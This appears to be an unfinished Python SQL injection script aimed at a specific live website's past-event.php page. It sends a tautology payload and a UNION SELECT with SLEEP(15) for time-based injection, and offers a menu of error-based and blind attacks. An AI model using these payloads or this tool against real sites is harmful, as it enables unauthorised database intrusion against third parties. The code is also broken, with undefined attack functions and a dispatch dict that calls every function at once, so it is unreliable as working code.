import urllib.request 
import urllib.error 
import requests

req = 'http://achromicpoint.com/past-event.php?id=186'
#req = input("Enter the url:")
#req = 'https://en.wikipedia.org/wiki/Phrack'

#choosing the type of attack
def perform(url):
	resp = urllib.request.urlopen(url+ "=1\' or \'1\' = \'1\'")
	body = resp.read() 
	fullbody = body.decode('utf-8')
	if "You have error in your SQL syntax" not in fullbody:
		print("The given url is not vulnerable")
		#exit(0)
	print("Type of attacks to perform")
	print("1:Time Based Attack\n2:Error Based Attack\n3:Blind Based Attack")
	attack = int(input("Choose the Type:"))
	switcher = {
		0: print("working"),
		1: time_based(req),
		2: error_based(req),
		3: blind_based(req)
	}

def time_based(req):
	result = requests.get(req)
	time = result.elapsed.total_seconds()
	resp = urllib.request.urlopen(req+ "UNION SELECT * FROM products WHERE id=1-SLEEP(15)")
	
'''
	if time < 2.5:
		print("Given url is vulnerable")
	else:
		print("The given url is not defined")
'''

if __name__ == "__main__":
	try:
		response = urllib.request.urlopen(req)
		print(response)
		perform(req)
	except urllib.error.URLError as e:
		if hasattr(e, 'reason'):
			print('We failed to reach a server.')
			print('Reason: ', e.reason)				
		elif hasattr(e, 'code'):
			print('The server couldn\'t fulfill the request.')
			print('Error code: ', e.code)
		else:
	    		print('everything is fine')	    
    	

'''
webUrl  = urllib.request.urlopen('https://www.youtube.com/user/guru99com')

#get the result code and print it
print ("result code: " + str(webUrl.getcode()))

# read the data from the URL and print it
data = webUrl.read()
print (data)
'''
	



	

